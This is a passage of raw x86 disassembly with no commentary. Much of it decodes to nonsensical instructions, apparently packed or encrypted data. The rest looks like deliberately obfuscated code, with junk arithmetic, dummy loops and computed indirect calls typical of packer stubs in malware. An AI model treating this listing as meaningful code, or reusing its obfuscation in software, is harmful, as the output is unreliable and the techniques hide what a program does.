  4119b4:	and    DWORD PTR [ebp-0x322616dc],esi
  4119ba:	dec    esp
  4119bb:	sub    eax,0x1ff62c01
  4119c0:	mov    ds:0xdd5a910e,eax
  4119c5:	pop    esp
  4119c6:	mov    cl,0x48
  4119c8:	retf   
  4119c9:	xchg   ebx,eax
  4119ca:	data16 fisubr DWORD PTR [esi+0x6cbb55ca]
  4119d1:	cmc    
  4119d2:	mov    WORD PTR [edi+ebx*2],fs
  4119d5:	ror    BYTE PTR [edx-0x27],1
  4119d8:	imul   eax,DWORD PTR [ebx-0x7b],0x400cf597
  4119df:	jge    0x411961
  4119e1:	ins    BYTE PTR es:[edi],dx
  4119e2:	in     al,dx
  4119e3:	mov    al,0x31
  4119e5:	out    0x78,eax
  4119e7:	lock lock cmp eax,0xde9d6e8
  4119ee:	cmp    al,0xbd
  4119f0:	pop    eax
  4119f1:	adc    edx,ecx
  4119f3:	add    al,0x11
  4119f5:	xchg   esp,eax
  4119f6:	pop    es
  4119f7:	pop    es
  4119f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119f9:	loop   0x411a2d
  4119fb:	cmp    ebp,eax
  4119fd:	push   cs
  4119fe:	sbb    eax,DWORD PTR [ebx+0x5c]
  411a01:	mov    al,ds:0x2160d52c
  411a06:	cmp    DWORD PTR [ebx+0x39838e25],ebp
  411a0c:	aas    
  411a0d:	sub    eax,0xabfabc19
  411a12:	iret   
  411a13:	push   esi
  411a14:	add    DWORD PTR [ebp-0x4484cc4f],0xffffffd5
  411a1b:	xor    bl,BYTE PTR [edx+0x34]
  411a1e:	mov    bl,0x19
  411a20:	imul   ecx,DWORD PTR [esi],0x3d
  411a23:	xor    BYTE PTR [ebx],0xce
  411a26:	add    ecx,edi
  411a28:	xor    edx,edx
  411a2a:	div    ecx
  411a2c:	mov    ecx,DWORD PTR [ebp-0x4]
  411a2f:	xor    ecx,esi
  411a31:	lea    eax,[ecx+eax*1+0x3272f6]
  411a38:	mov    ecx,DWORD PTR [ebp+0x8]
  411a3b:	mov    edx,DWORD PTR [ebp-0x20]
  411a3e:	mov    DWORD PTR [edx+ecx*4],eax
  411a41:	mov    eax,DWORD PTR [ebp-0xc]
  411a44:	mov    ecx,DWORD PTR [ebp+0x8]
  411a47:	xor    eax,esi
  411a49:	lea    eax,[eax+ecx*1+0x3272f6]
  411a50:	mov    DWORD PTR [ebp+0x8],eax
  411a53:	mov    eax,DWORD PTR [ebp-0xc]
  411a56:	mov    ecx,DWORD PTR [ebp+0x14]
  411a59:	xor    eax,esi
  411a5b:	add    eax,edi
  411a5d:	imul   eax,DWORD PTR [ecx]
  411a60:	mov    ecx,DWORD PTR [ebp-0x4]
  411a63:	mov    edx,DWORD PTR [ebp+0x8]
  411a66:	xor    ecx,esi
  411a68:	lea    ecx,[ecx+edx*1+0x3272f6]
  411a6f:	cmp    ecx,eax
  411a71:	jne    0x40f668
  411a77:	mov    eax,DWORD PTR [ebp-0x4]
  411a7a:	xor    eax,esi
  411a7c:	add    eax,edi
  411a7e:	mov    DWORD PTR [ebp-0x10],eax
  411a81:	mov    ebx,0x65655
  411a86:	add    ebx,0x3234
  411a8c:	xchg   ebx,esi
  411a8e:	xor    ebx,ebx
  411a90:	push   esi
  411a91:	mov    esi,ebx
  411a93:	pop    ebx
  411a94:	mov    edx,esi
  411a96:	add    ebx,0x1002
  411a9c:	lea    eax,[ebp-0x18]
  411a9f:	add    edx,eax
  411aa1:	add    edx,0x5
  411aa4:	push   edx
  411aa5:	inc    esi
  411aa6:	pop    ecx
  411aa7:	dec    ecx
  411aa8:	xchg   ecx,eax
  411aa9:	dec    eax
  411aaa:	xchg   ecx,eax
  411aab:	dec    ecx
  411aac:	xchg   ecx,edx
  411aae:	dec    edx
  411aaf:	push   edx
  411ab0:	mov    edx,ebx
  411ab2:	pop    ebx
  411ab3:	dec    ebx
  411ab4:	call   DWORD PTR [ebx]
  411ab6:	cmp    DWORD PTR [ebp+0x10],esi
  411ab9:	je     0x411ada
  411abf:	xchg   edx,eax
  411ac0:	push   0xc
  411ac2:	pop    ecx
  411ac3:	dec    ecx
  411ac4:	push   0x3
  411ac6:	pop    ebx
  411ac7:	inc    ebx
  411ac8:	xchg   ebx,ecx
  411aca:	inc    ecx
  411acb:	sub    ebx,ecx
  411acd:	xchg   ebx,ecx
  411acf:	dec    ecx
  411ad0:	dec    ecx
  411ad1:	mov    eax,DWORD PTR [ebp-0x1c]
  411ad4:	imul   eax,ecx
  411ad7:	add    esp,eax
  411ad9:	xchg   edx,eax
  411ada:	push   eax
  411adb:	xor    ebx,ebx
  411add:	mov    edx,esp
  411adf:	dec    edx
  411ae0:	inc    ebx
  411ae1:	add    ebx,DWORD PTR [edx+ebx*1]
  411ae4:	dec    ebx
  411ae5:	xor    edx,edx
  411ae7:	add    DWORD PTR [ebp-0x10],ebx
  411aea:	pop    ebx
  411aeb:	mov    eax,DWORD PTR [ebp-0x10]
  411aee:	pop    edi
  411aef:	pop    esi
  411af0:	pop    ebx
  411af1:	leave  
  411af2:	ret    0x10
  411af5:	push   ebp
  411af6:	mov    ebp,esp
  411af8:	push   ecx
  411af9:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  411b00:	mov    eax,DWORD PTR [ebp-0x4]
  411b03:	sbb    DWORD PTR ds:0x428ea7,ebx
  411b09:	mov    edx,DWORD PTR [ebp+0x10]
  411b0c:	mov    ecx,0x75108af
  411b11:	sbb    DWORD PTR ds:0x428eaf,0x428e4b
  411b1b:	xor    eax,ecx
  411b1d:	or     DWORD PTR ds:0x428e77,0x428e2b
  411b27:	add    eax,0x3272f6
  411b2c:	and    DWORD PTR ds:0x428e77,0x1e6e
  411b36:	mov    DWORD PTR [edx],eax
  411b38:	mov    eax,DWORD PTR [ebp+0xc]
  411b3b:	xor    eax,ecx
  411b3d:	or     DWORD PTR ds:0x428eab,0x179
  411b47:	push   esi
  411b48:	mov    esi,DWORD PTR [ebp+0x10]
  411b4b:	mov    edx,DWORD PTR ds:0x428ea7
  411b51:	sbb    DWORD PTR ds:0x428eaf,edx
  411b57:	mov    edx,0x3272f6
  411b5c:	xor    DWORD PTR ds:0x428eab,0x428e83
  411b66:	add    eax,edx
  411b68:	or     DWORD PTR ds:0x428e83,0x428e6f
  411b72:	mov    DWORD PTR [esi+0x4],eax
  411b75:	mov    eax,DWORD PTR [ebp+0x14]
  411b78:	movzx  esi,WORD PTR ds:0x428ecf
  411b7f:	sub    DWORD PTR ds:0x428e9b,esi
  411b85:	mov    esi,DWORD PTR [ebp+0x10]
  411b88:	adc    DWORD PTR ds:0x428e5b,0xf72
  411b92:	mov    DWORD PTR [esi+0x8],eax
  411b95:	mov    eax,DWORD PTR [ebp+0x18]
  411b98:	mov    esi,DWORD PTR [ebp+0x10]
  411b9b:	mov    DWORD PTR [esi+0xc],eax
  411b9e:	mov    eax,DWORD PTR [ebp+0x1c]
  411ba1:	mov    esi,DWORD PTR [ebp+0x10]
  411ba4:	mov    DWORD PTR [esi+0x10],eax
  411ba7:	mov    eax,DWORD PTR [ebp+0x8]
  411baa:	xor    eax,ecx
  411bac:	add    eax,edx
  411bae:	pop    esi
  411baf:	leave  
  411bb0:	ret    0x18
  411bb3:	push   ebp
  411bb4:	mov    ebp,esp
  411bb6:	sub    esp,0x9c
  411bbc:	sbb    ecx,0x4d1
  411bc2:	mov    ecx,DWORD PTR [ebp+0x8]
  411bc5:	mov    eax,0x8a9b
  411bca:	xor    ax,WORD PTR [ecx+0x20]
  411bce:	mov    ecx,DWORD PTR ds:0x428ea7
  411bd4:	adc    DWORD PTR ds:0x428e9f,ecx
  411bda:	mov    ecx,0x3b5d
  411bdf:	sub    DWORD PTR ds:0x428eab,0x1476
  411be9:	add    ax,cx
  411bec:	movzx  eax,ax
  411bef:	mov    DWORD PTR ds:0x428e8b,0x1b
  411bf9:	cmp    DWORD PTR ds:0x428e8b,0x0
  411c00:	je     0x411c4c
  411c06:	cmp    DWORD PTR ds:0x428e8b,0x2
  411c0d:	ja     0x411c4c
  411c13:	jmp    0x411c20
  411c18:	push   0x4
  411c1a:	call   DWORD PTR ds:0x42aa2b
  411c20:	cmp    DWORD PTR ds:0x428e8b,0x3
  411c27:	jne    0x411c3a
  411c2d:	mov    ecx,DWORD PTR ds:0x428e8b
  411c33:	dec    ecx
  411c34:	mov    DWORD PTR ds:0x428e8b,ecx
  411c3a:	mov    ecx,DWORD PTR ds:0x428e8b
  411c40:	dec    ecx
  411c41:	mov    DWORD PTR ds:0x428e8b,ecx
  411c47:	jmp    0x411bf9
  411c4c:	mov    DWORD PTR [ebp-0x10],eax
  411c4f:	mov    BYTE PTR [ebp-0x1],0x82
  411c53:	lea    eax,[ebp-0x1]
  411c56:	or     DWORD PTR ds:0x428e33,0x2387
  411c60:	mov    DWORD PTR [ebp-0xc],eax
  411c63:	xor    DWORD PTR ds:0x428e7f,edi
  411c69:	mov    al,BYTE PTR [ebp-0x1]
  411c6c:	mov    ecx,DWORD PTR [ebp-0xc]
  411c6f:	sbb    DWORD PTR ds:0x428ebf,0x63b1
  411c79:	xor    al,0x7f
  411c7b:	sbb    DWORD PTR ds:0x428e43,0x428e93
  411c85:	add    al,0x4
  411c87:	adc    DWORD PTR ds:0x428e5b,0xd9d
  411c91:	mov    BYTE PTR [ecx],al
  411c93:	and    eax,DWORD PTR ds:0x428eaf
  411c99:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  411ca0:	push   ebx
  411ca1:	mov    ecx,DWORD PTR ds:0x428e57
  411ca7:	add    DWORD PTR ds:0x428e6f,ecx
  411cad:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  411cb4:	not    eax
  411cb6:	mov    ecx,DWORD PTR [ebp-0x18]
  411cb9:	mov    DWORD PTR ds:0x428ebf,0x1e
  411cc3:	cmp    DWORD PTR ds:0x428ebf,0x0
  411cca:	je     0x4140d3
  411cd0:	cmp    DWORD PTR ds:0x428ebf,0x3
  411cd7:	jg     0x4140d3
  411cdd:	jmp    0x411cf2
  411ce2:	push   0x428e97
  411ce7:	push   0x1953
  411cec:	call   DWORD PTR ds:0x42aa2f
  411cf2:	cmp    DWORD PTR ds:0x428ebf,0x4
  411cf9:	jne    0x411d0a
  411cff:	mov    eax,ds:0x428ebf
  411d04:	dec    eax
  411d05:	mov    ds:0x428ebf,eax
  411d0a:	mov    eax,ds:0x428ebf
  411d0f:	dec    eax
  411d10:	mov    ds:0x428ebf,eax
  411d15:	jmp    0x411cc3
  411d1a:	jmp    0x4140d3
  411d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d20:	test   al,0xbe
  411d22:	cdq    
  411d23:	mov    esp,0x1c848485
  411d28:	pcmpgtw mm0,QWORD PTR [eax+0x4f926025]
  411d2f:	xor    DWORD PTR [ebx+0x60e78383],ecx
  411d35:	add    DWORD PTR [ebx+0x3a223b72],0x4b
  411d3c:	push   0xd4ab8212
  411d41:	lock inc ecx
  411d43:	rcl    DWORD PTR [edi+ecx*2+0x11d56ea9],0x81
  411d4b:	and    BYTE PTR [ecx-0x3],0x1e
  411d4f:	sar    DWORD PTR [edx+eiz*8],cl
  411d52:	mov    ebp,0x2d07ad9
  411d57:	jne    0x411d31
  411d59:	cmc    
  411d5a:	dec    edi
  411d5b:	push   ebx
  411d5c:	cmp    BYTE PTR [edx],0xb7
  411d5f:	clc    
  411d60:	dec    edi
  411d61:	or     BYTE PTR ds:0x492e3456,al
  411d67:	enter  0xe272,0xac
  411d6b:	mov    ds:0xe11f857f,al
  411d70:	push   ss
  411d71:	cmp    dl,BYTE PTR [edx-0x57]
  411d74:	sbb    DWORD PTR ds:0xb59d0291,edi
  411d7a:	lods   eax,DWORD PTR ds:[esi]
  411d7b:	mov    ecx,0x3979b8f0
  411d81:	adc    DWORD PTR [eax],0x1655fb12
  411d87:	out    0x90,eax
  411d89:	sbb    ch,BYTE PTR [eax+0x3c]
  411d8c:	outs   dx,BYTE PTR ds:[esi]
  411d8d:	scas   al,BYTE PTR es:[edi]
  411d8e:	daa    
  411d8f:	mov    bl,0x6f
  411d91:	daa    
  411d92:	enter  0x4dc,0x9a
  411d96:	xor    al,0x16
  411d98:	sbb    DWORD PTR [esi],esi
  411d9a:	fistp  QWORD PTR [ebp+ebp*1+0x52]
  411d9e:	lea    esi,[ebx-0x5]
  411da1:	adc    bl,0x6b
  411da4:	sub    eax,0xc304cf1c
  411da9:	add    ch,dh
  411dab:	das    
  411dac:	out    0xa0,eax
  411dae:	push   eax
  411daf:	pusha  
  411db0:	dec    esi
  411db1:	jb     0x411d70
  411db3:	push   ds
  411db4:	call   0xe16e:0xe8bcc8ca
  411dbb:	mov    ebx,0xd955bdb6
  411dc0:	xchg   ebx,eax
  411dc1:	cs push ds
  411dc3:	clc    
  411dc4:	inc    edi
  411dc5:	inc    edx
  411dc6:	mov    ebx,0x4e4de36d
  411dcb:	push   ebx
  411dcc:	daa    
  411dcd:	icebp  
  411dce:	pop    ds
  411dcf:	inc    esp
  411dd0:	xor    al,BYTE PTR [eax-0x74]
  411dd3:	sti    
  411dd4:	cmp    BYTE PTR [edi+0x21bfef6a],bl
  411dda:	jle    0x411e32
  411ddc:	rcl    DWORD PTR [ebx],0x88
  411ddf:	push   ss
  411de0:	xchg   edi,eax
  411de1:	mov    edx,0x37530b1e
  411de6:	lods   al,BYTE PTR ds:[esi]
  411de7:	xchg   esi,eax
  411de8:	cmp    cl,dl
  411dea:	cs xor eax,0xe498c3e6
  411df0:	xchg   edx,eax
  411df1:	and    BYTE PTR [ebx+0x11],cl
  411df4:	sbb    esi,ebp
  411df6:	mov    esi,0x94947f21
  411dfb:	lods   al,BYTE PTR ds:[esi]
  411dfc:	push   edi
  411dfd:	sbb    ah,dh
  411dff:	mov    edi,0x8bb9b895
  411e04:	xor    DWORD PTR [edx+0x33],edi
  411e07:	or     al,0x96
  411e09:	or     al,0x2b
  411e0b:	aaa    
  411e0c:	leave  
  411e0d:	retf   
  411e0e:	es inc ebx
  411e10:	loope  0x411dc5
  411e12:	push   0x3e
  411e14:	popf   
  411e15:	ins    DWORD PTR es:[edi],dx
  411e16:	fcomp  QWORD PTR [ebx+0x4ef336a]
  411e1c:	or     eax,0xa9a249ba
  411e21:	mov    esp,0x1fff7f19
  411e26:	inc    edi
  411e27:	aad    0xc1
  411e29:	push   0x2d095507
  411e2e:	mov    dl,0x3f
  411e30:	and    al,0xa6
  411e32:	in     eax,0xf8
  411e34:	mov    bl,0xc
  411e36:	repnz sub eax,0x45de9da1
  411e3c:	dec    edx
  411e3d:	lds    ebx,FWORD PTR [ecx+0x9e3857b]
  411e43:	stos   BYTE PTR es:[edi],al
  411e44:	lahf   
  411e45:	int    0xcf
  411e47:	fnstsw WORD PTR [ebp+edi*4+0x7d]
  411e4b:	test   al,0x82
  411e4d:	loope  0x411e3c
  411e4f:	sub    eax,0x66592784
  411e54:	push   cs
  411e55:	pop    edx
  411e56:	sbb    cl,BYTE PTR [ebp+edi*2-0x14]
  411e5a:	push   ebx
  411e5b:	pop    edx
  411e5c:	call   0x6302b140
  411e61:	mov    ds:0x4522c006,al
  411e66:	(bad)  
  411e67:	test   al,0xb
  411e69:	mov    edi,DWORD PTR [esi+0x50]
  411e6c:	mov    ds,WORD PTR [esi-0x2d]
  411e6f:	bound  ecx,QWORD PTR [esi+0x22]
  411e72:	loopne 0x411e56
  411e74:	jmp    0xaa18c364
  411e79:	mov    cl,0xe6
  411e7b:	cmp    al,0xe8
  411e7d:	(bad)  
  411e7e:	int3   
  411e7f:	xchg   ecx,eax
  411e81:	jg     0x411e3e
  411e83:	push   0x5e
  411e85:	adc    eax,0x1da2c30d
  411e8a:	add    DWORD PTR [ebx+0x70eefdca],esi
  411e90:	mov    ch,0xfa
  411e92:	scas   al,BYTE PTR es:[edi]
  411e93:	dec    ebx
  411e94:	add    DWORD PTR [ecx],eax
  411e96:	push   ebx
  411e97:	and    DWORD PTR [edi],ebx
  411e99:	jb     0x411ea6
  411e9b:	jbe    0x411e5f
  411e9d:	lds    esi,FWORD PTR [ebx]
  411e9f:	fst    st(0)
  411ea1:	sub    eax,0xd9d10c95
  411ea6:	jge    0x411ea8
  411ea8:	in     al,0xf
  411eaa:	push   eax
  411eab:	addr16 dec eax
  411ead:	cmp    cl,dh
  411eaf:	xchg   ebp,eax
  411eb0:	into   
  411eb1:	fnsave [edi-0x8]
  411eb4:	int3   
  411eb5:	out    0xef,al
  411eb7:	add    bh,dl
  411eb9:	mov    BYTE PTR [ebp+0x31],dl
  411ebc:	out    dx,eax
  411ebd:	fcomp  DWORD PTR [ebx]
  411ebf:	jne    0x411e56
  411ec1:	xlat   BYTE PTR ds:[ebx]
  411ec2:	out    dx,eax
  411ec3:	enter  0x4089,0xbd
  411ec7:	push   edx
  411ec8:	cwde   
  411ec9:	and    cl,BYTE PTR [esi]
  411ecb:	xor    DWORD PTR [edx-0x499f349d],edx
  411ed1:	in     eax,0xf3
  411ed3:	mov    BYTE PTR [esi],bh
  411ed5:	icebp  
  411ed6:	aam    0xed
  411ed8:	sbb    al,0x85
  411eda:	call   0xca76:0xfc4d0cb3
  411ee1:	jne    0x411ef2
  411ee3:	jmp    0x463b:0x37dd7719
  411eea:	imul   edi,DWORD PTR [ebp+ecx*8-0x2a3fc8d],0x4e
  411ef2:	or     ecx,ecx
  411ef4:	mov    ebp,DWORD PTR [ecx+0xcad7bf3]
  411efa:	(bad)  
  411efb:	xchg   esi,eax
  411efc:	push   cs
  411efd:	mov    esi,0xb26f35d9
  411f02:	in     al,dx
  411f03:	dec    eax
  411f04:	(bad)  
  411f05:	mov    ebp,0x60ea1dbb
  411f0a:	pop    ebx
  411f0b:	add    al,0x72
  411f0d:	stos   BYTE PTR es:[edi],al
  411f0e:	in     al,0xc9
  411f10:	jp     0x411f58
  411f12:	xchg   ebx,eax
  411f13:	in     al,0xd3
  411f15:	(bad)  
  411f16:	lea    esi,[ecx-0x61b60d55]
  411f1c:	int3   
  411f1d:	push   edx
  411f1e:	mov    edx,0x5e9584d6
  411f23:	push   ebp
  411f24:	aas    
  411f25:	daa    
  411f26:	(bad)  
  411f27:	jecxz  0x411ead
  411f29:	movaps xmm7,XMMWORD PTR [edi-0x13]
  411f2d:	inc    ecx
  411f2e:	mov    esp,0xee866016
  411f33:	jle    0x411ed3
  411f35:	daa    
  411f36:	jg     0x411f04
  411f38:	inc    eax
  411f39:	pop    ebp
  411f3a:	jge    0x411f16
  411f3c:	cmp    eax,0xf1e66937
  411f41:	push   ebx
  411f42:	and    esi,edi
  411f44:	not    WORD PTR [edi]
  411f47:	cmp    DWORD PTR [ecx+0x16],edx
  411f4a:	push   edi
  411f4b:	outs   dx,DWORD PTR ds:[esi]
  411f4c:	cmp    al,0xfb
  411f4e:	adc    ch,dl
  411f50:	jp     0x411fb0
  411f52:	cmp    eax,0xf082c6af
  411f57:	xchg   edi,eax
  411f58:	in     eax,0x2e
  411f5a:	xor    DWORD PTR [eax+0x46],ecx
  411f5d:	cmp    ebx,ebx
  411f5f:	cmp    BYTE PTR ds:0x428f3c6d,bl
  411f65:	sbb    DWORD PTR [esi+0x2b],ecx
  411f68:	cmp    esp,DWORD PTR ds:0x3147839
  411f6e:	jmp    0x76685d83
  411f73:	retf   
  411f74:	into   
  411f75:	out    0xd,eax
  411f77:	or     al,0x23
  411f79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f7a:	mov    ds:0xf734c0c,eax
  411f7f:	inc    eax
  411f80:	xchg   edi,eax
  411f81:	mov    ebp,0xb3dcf4df
  411f86:	inc    esi
  411f87:	out    dx,eax
  411f88:	ficomp DWORD PTR [esi-0xa55d7e3]
  411f8e:	stos   BYTE PTR es:[edi],al
  411f8f:	push   edx
  411f90:	adc    eax,0x2c5c95c7
  411f95:	fidivr WORD PTR [ecx]
  411f97:	xor    al,dh
  411f99:	pop    edi
  411f9a:	or     BYTE PTR [edi-0x3d],dl
  411f9d:	test   DWORD PTR [ebp+0x2cd4d469],edx
  411fa3:	nop
  411fa4:	cld    
  411fa5:	or     esp,DWORD PTR [ebx]
  411fa7:	cmp    BYTE PTR [ebx+ebp*2-0x50],dl
  411fab:	mov    dl,0xf5
  411fad:	xor    al,0xcf
  411faf:	lahf   
  411fb0:	ins    DWORD PTR es:[edi],dx
  411fb1:	sub    ch,BYTE PTR [edx-0x58]
  411fb4:	mov    eax,ds:0xde9a9925
  411fb9:	addr16 and ebx,edx
  411fbc:	mov    al,0x46
  411fbe:	xchg   BYTE PTR [esi+eiz*2-0x61],dl
  411fc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fc3:	pushf  
  411fc4:	mov    cl,0xf0
  411fc6:	lds    eax,FWORD PTR [esi-0x4c]
  411fc9:	sbb    DWORD PTR [ebx+0x6fe0e45a],ecx
  411fcf:	fmul   st,st(0)
  411fd1:	sub    DWORD PTR [ecx+0x1a],edx
  411fd4:	sti    
  411fd5:	fst    DWORD PTR [edi]
  411fd7:	(bad)  
  411fd9:	loop   0x411fc6
  411fdb:	sub    BYTE PTR [ecx],0xbb
  411fde:	push   cs
  411fdf:	movups xmm7,xmm2
  411fe2:	xchg   ebp,eax
  411fe3:	mov    bh,0x9e
  411fe5:	push   ebp
  411fe6:	fcomp  QWORD PTR [ebx+0x33]
  411fe9:	or     al,0xe1
  411feb:	dec    esi
  411fec:	xor    BYTE PTR [ebx-0x687330d5],bl
  411ff2:	mov    ch,0x5b
  411ff4:	outs   dx,DWORD PTR ds:[esi]
  411ff5:	arpl   di,cx
  411ff7:	pop    esi
  411ff8:	sbb    bh,cl
  411ffa:	lds    esi,FWORD PTR [edi-0x38]
  411ffd:	sar    BYTE PTR [eax-0x63],cl
  412000:	(bad)  
  412001:	mov    ds:0x4b91dee1,eax
  412006:	fsubr  DWORD PTR [ebp+0x554e0c42]
  41200c:	adc    eax,0xa65cc12b
  412011:	(bad)  
  412012:	sub    al,0x54
  412014:	pop    ebx
  412015:	push   0xffffffdf
  412017:	xchg   edx,eax
  412018:	shr    DWORD PTR [ebp+0x31e4f436],1
  41201e:	xchg   edi,eax
  41201f:	pushf  
  412020:	mov    edi,0xa34217fa
  412025:	jbe    0x412062
  412027:	in     al,0x9b
  412029:	adc    al,0x54
  41202b:	lods   al,BYTE PTR ds:[esi]
  41202c:	xchg   esp,eax
  41202d:	xchg   esi,eax
  41202e:	mov    ch,0x9f
  412030:	xor    al,0xc8
  412032:	mov    bh,BYTE PTR [esi-0x43]
  412035:	(bad)  
  412036:	(bad)  
  412037:	stos   BYTE PTR es:[edi],al
  412038:	push   ds
  412039:	cwde   
  41203a:	mov    DWORD PTR [edx-0x20],edx
  41203d:	test   eax,0x5e126be3
  412042:	xor    BYTE PTR [eax],0xf2
  412045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412046:	(bad)  
  412047:	js     0x412004
  412049:	push   es
  41204a:	ja     0x412050
  41204c:	or     ch,BYTE PTR ds:0xae121368
  412052:	add    dl,BYTE PTR [edi]
  412054:	adc    BYTE PTR gs:[eax],ah
  412057:	(bad)  
  412058:	arpl   WORD PTR [ebx],ax
  41205a:	jb     0x41202b
  41205c:	in     eax,0x5a
  41205e:	push   ds
  41205f:	sbb    cl,BYTE PTR [ecx]
  412061:	pop    edx
  412062:	mov    ebp,DWORD PTR [ecx+0xf32bb71]
  412068:	mov    ah,0xf1
  41206a:	(bad)  
  41206b:	fsub   DWORD PTR [ebp+0x4a090ae9]
  412071:	in     al,0x51
  412073:	adc    eax,0x8652b22a
  412078:	jmp    0x1158:0x3a7a94c3
  41207f:	jecxz  0x4120db
  412081:	cdq    
  412082:	lods   eax,DWORD PTR ds:[esi]
  412083:	sub    ah,BYTE PTR [edx-0x39]
  412086:	or     al,0xdf
  412088:	scas   al,BYTE PTR es:[edi]
  412089:	inc    ecx
  41208a:	iret   
  41208b:	pop    ecx
  41208c:	or     DWORD PTR [esi+0x3aa89653],0x10
  412093:	cmp    eax,0x32d0a024
  412098:	dec    eax
  412099:	icebp  
  41209a:	xchg   BYTE PTR [edx],bh
  41209c:	jg     0x412057
  41209e:	out    0x13,eax
  4120a0:	or     eax,0x2aec20fd
  4120a5:	outs   dx,BYTE PTR ds:[esi]
  4120a6:	adc    BYTE PTR [edx+edx*4-0x7c],cl
  4120aa:	int3   
  4120ab:	mov    ecx,DWORD PTR [edi+esi*4]
  4120ae:	mov    esi,0x54dd3fa6
  4120b3:	loop   0x412116
  4120b5:	add    esi,edx
  4120b7:	pop    ebx
  4120b8:	into   
  4120b9:	retf   
  4120ba:	std    
  4120bb:	cld    
  4120bc:	retf   0x6ec6
  4120bf:	dec    eax
  4120c0:	enter  0x8094,0xfe
  4120c4:	hlt    
  4120c5:	push   ss
  4120c6:	adc    eax,0xb703919
  4120cb:	fist   WORD PTR ds:0x4082032d
  4120d1:	int    0x19
  4120d3:	cwde   
  4120d4:	mov    cl,0xc7
  4120d6:	daa    
  4120d7:	xlat   BYTE PTR ds:[ebx]
  4120d8:	inc    eax
  4120d9:	and    al,0xa4
  4120db:	sahf   
  4120dc:	das    
  4120dd:	jmp    0x412136
  4120df:	fldenv [ecx]
  4120e1:	sub    eax,0xeac94216
  4120e6:	out    dx,al
  4120e7:	adc    ah,bh
  4120e9:	adc    BYTE PTR [eax+0x213accb7],0x7e
  4120f0:	inc    ecx
  4120f1:	and    eax,0x89915cce
  4120f6:	jae    0x412177
  4120f8:	repnz and ecx,ebx
  4120fb:	xor    bl,BYTE PTR [eax]
  4120fd:	aaa    
  4120fe:	pop    ss
  4120ff:	cwde   
  412100:	jmp    0x412160
  412102:	jle    0x412152
  412104:	jle    0x412169
  412106:	mov    bl,0x8d
  412108:	push   edx
  412109:	cmp    dl,ah
  41210b:	inc    ebx
  41210c:	mov    ds:0x2625ffcf,eax
  412111:	hlt    
  412112:	mov    al,0xa5
  412114:	ds ret 0x998
  412118:	jg     0x4120cd
  41211a:	inc    esp
  41211b:	inc    esp
  41211c:	mov    ebp,0xaade4332
  412121:	mov    eax,ds:0xbdaf27d
  412126:	jl     0x4120b8
  412128:	xchg   ecx,eax
  412129:	mov    dl,0xc7
  41212b:	stc    
  41212c:	fdivr  DWORD PTR [edi+0xac3b611]
  412132:	dec    esi
  412133:	inc    esi
  412134:	mov    esi,0xd3302906
  412139:	fnclex 
  41213b:	mov    dh,0x8c
  41213d:	or     BYTE PTR [ecx-0x5c1e8150],dh
  412143:	ret    0xff64
  412146:	pop    ebx
  412147:	dec    ecx
  412148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412149:	jns    0x41215c
  41214b:	jl     0x412187
  41214d:	push   es
  41214e:	push   ecx
  41214f:	push   ecx
  412150:	fnstcw WORD PTR [ecx+0x7]
  412153:	mov    ebx,0x137b5206
  412158:	mov    ch,0x12
  41215a:	adc    ecx,DWORD PTR [ebp+0x35a97ca]
  412160:	les    eax,FWORD PTR [edx+0x7b]
  412163:	nop
  412164:	xchg   DWORD PTR [edi+0x4f],eax
  412167:	daa    
  412168:	xchg   edi,eax
  412169:	or     DWORD PTR [ebx+0x594f3f88],edx
  41216f:	repz (bad) 
  412171:	ins    DWORD PTR es:[edi],dx
  412172:	add    DWORD PTR [ebx],0x207547e4
  412178:	pop    esp
  412179:	aad    0x8c
  41217b:	sti    
  41217c:	loope  0x41216d
  41217e:	mov    dl,0xf1
  412180:	fwait
  412181:	sub    cl,BYTE PTR [edi+esi*2-0x38f97713]
  412188:	ja     0x41210c
  41218a:	int    0xb9
  41218c:	add    eax,0x7484932b
  412191:	mov    al,ds:0x47964ed5
  412196:	ins    DWORD PTR es:[edi],dx
  412197:	loop   0x412120
  412199:	pop    esi
  41219a:	xchg   ecx,eax
  41219b:	out    dx,al
  41219c:	clc    
  41219d:	mov    ebx,0x864982bf
  4121a2:	shr    BYTE PTR [ebx],cl
  4121a4:	lea    ebx,[edx-0x3b]
  4121a7:	fbstp  TBYTE PTR [esi+0x6b112ade]
  4121ad:	xchg   ebx,eax
  4121ae:	sub    al,0x1f
  4121b0:	mov    edi,0x3a867f16
  4121b5:	rol    bl,cl
  4121b7:	mov    ds:0xf47b84c7,al
  4121bc:	add    bl,dl
  4121be:	xor    DWORD PTR [esi+0x3d],ecx
  4121c1:	addr16 push 0x5150d858
  4121c7:	in     al,0x59
  4121c9:	add    BYTE PTR [esi-0x53c36977],ch
  4121cf:	dec    esi
  4121d0:	in     al,dx
  4121d1:	mov    edi,0xb28ccf6c
  4121d6:	cmp    edi,0x6e
  4121d9:	mov    ebx,0x28967683
  4121de:	jmp    0x412218
  4121e0:	(bad)  
  4121e1:	retf   
  4121e2:	mov    ah,0x3f
  4121e4:	jge    0x4121d8
  4121e6:	popa   
  4121e7:	push   eax
  4121e8:	daa    
  4121e9:	fdiv   DWORD PTR [eax]
  4121eb:	or     eax,0xc9473f22
  4121f0:	pop    edi
  4121f1:	out    0xd4,al
  4121f3:	jmp    0x1321d45d
  4121f8:	mov    al,ds:0x89729b22
  4121fd:	dec    edi
  4121fe:	lahf   
  4121ff:	mov    dh,0x3e
  412201:	dec    esi
  412202:	push   es
  412203:	test   cl,bl
  412205:	scas   al,BYTE PTR es:[edi]
  412206:	sub    eax,0x1883c290
  41220b:	in     al,0x1c
  41220d:	repz shr BYTE PTR [ecx],1
  412210:	sahf   
  412211:	call   0xebe8ef0a
  412216:	mov    ah,0xc6
  412218:	pop    ss
  412219:	push   0xfffffff7
  41221b:	dec    ebx
  41221c:	adc    esp,edx
  41221e:	mov    bh,0x10
  412220:	adc    eax,0xd4fddc
  412225:	and    eax,0x7ecb3a30
  41222a:	mov    edi,DWORD PTR ds:[eax+0x7]
  41222e:	fs or  al,0x8e
